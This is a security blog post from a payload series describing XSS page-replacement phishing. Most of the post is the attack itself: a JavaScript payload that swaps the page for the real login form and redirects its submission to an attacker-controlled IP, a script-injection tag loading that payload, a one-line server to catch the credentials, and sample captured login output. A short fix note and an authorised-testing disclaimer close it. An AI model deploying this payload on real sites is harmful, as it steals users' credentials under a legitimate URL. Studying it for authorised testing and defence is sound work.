---
layout: single
title: "XSS — Page-Replacement Phishing"
date: 2026-05-14
categories:
  - tools
  - payloads
  - xss
tags:
  - xss
  - cross-site-scripting
  - payloads
  - phishing
  - credential-theft
  - dom-manipulation
  - fetch-api
  - javascript
  - stored-xss
  - reflected-xss
  - social-engineering
  - web-application-pentest
  - owasp
  - owasp-a03-injection
  - cwe-79
  - bugbounty
  - tools
author_profile: true
read_time: true
show_date: true
toc: true
toc_label: "Contents"
excerpt: "Replace the entire page with a cloned login form via XSS — the URL stays legitimate, the victim trusts it, and credentials go directly to your server."
header:
  teaser: /assets/images/Logo.png
---

<style>
.tool-cmd{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #9fef00;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:12px;color:#9fef00;margin:10px 0;white-space:pre-wrap;}
.tool-out{background:#0a0a0a;border:1px solid #1e1e1e;border-left:3px solid #4488ff;border-radius:4px;padding:10px 14px;font-family:'Courier New',monospace;font-size:11px;color:#888;margin:10px 0;white-space:pre-wrap;line-height:1.8;}
.remediation-box{background:#050d05;border:1px solid #9fef0022;border-radius:6px;padding:10px 14px;margin:16px 0;font-size:12px;color:#9fef0088;font-family:'Courier New',monospace;}
.remediation-box strong{color:#9fef00;}
table{width:100%;border-collapse:collapse;font-family:'Courier New',monospace;font-size:12px;margin:16px 0;}
th{background:#0a0a0a;color:#9fef00;padding:8px 12px;border:1px solid #1e1e1e;text-align:left;}
td{padding:8px 12px;border:1px solid #1e1e1e;color:#ccc;}
</style>

## Why This is Dangerous

Standard phishing uses a fake domain — savvy users check the URL. This attack replaces the **real page** with a cloned version. The URL stays `https://target.com`. The padlock stays green. The victim has no signal that anything is wrong.

## Step-by-Step

**Step 1 — Create `phishing.js`:**

```javascript
fetch("login").then(res => res.text().then(data => {
    document.getElementsByTagName("html")[0].innerHTML = data
    document.getElementsByTagName("form")[0].action = "http://192.168.XX.XX"
    document.getElementsByTagName("form")[0].method = "get"
}))
```

**Step 2 — Start your server (receives stolen credentials):**

<div class="tool-cmd">python3 -m http.server 80</div>

**Step 3 — Submit the injection:**

```html
<script src="http://192.168.XX.XX/phishing.js"></script>
```

## What Happens

1. Script fetches the real `/login` page HTML
2. Replaces the entire current page DOM with it — visually identical
3. Rewrites the form `action` to point to your server
4. Rewrites `method` to GET so credentials appear in your server log
5. Victim types credentials, hits submit → your server logs username + password

<div class="tool-out">GET /?username=admin&password=hunter2 HTTP/1.1
Host: 192.168.XX.XX</div>

## Why method=GET?

GET puts params in the URL → they appear in your HTTP access log automatically. POST would require parsing the body. For a quick PoC, GET is simpler to capture.

<div class="remediation-box"><strong>Fix:</strong> Prevent XSS to prevent this entirely. Additionally: implement CSRF tokens on all forms (they won't transfer to the attacker's endpoint), use SameSite=Strict cookies, and deploy subresource integrity checks.</div>

---

*All payloads documented for authorised security testing only. Do not use against systems without explicit written permission.*

<a href="https://buymeacoffee.com/sweshinfosec" target="_blank" style="font-family:monospace;font-size:13px;color:#9fef00;">&#9749; Buy Me a Coffee</a>
&nbsp;&nbsp;
<a href="https://www.patreon.com/c/SweshInfoSec" target="_blank" style="font-family:monospace;font-size:13px;color:#ff9800;">Patreon &rarr;</a>
